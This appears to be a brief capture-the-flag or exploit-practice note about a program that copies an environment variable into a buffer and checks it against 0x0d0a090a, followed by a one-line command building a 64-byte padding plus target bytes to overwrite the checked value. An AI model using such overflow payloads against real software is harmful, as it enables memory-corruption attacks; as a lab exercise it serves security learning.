the value taken from environment variable is copyed into the buffer

it is check with 0x0d0a090a 

exp=$(python3 -c 'print("A"*64 + chr(0x0a) + chr(0x09) + chr(0x0a) + chr(0x0d))') ./program


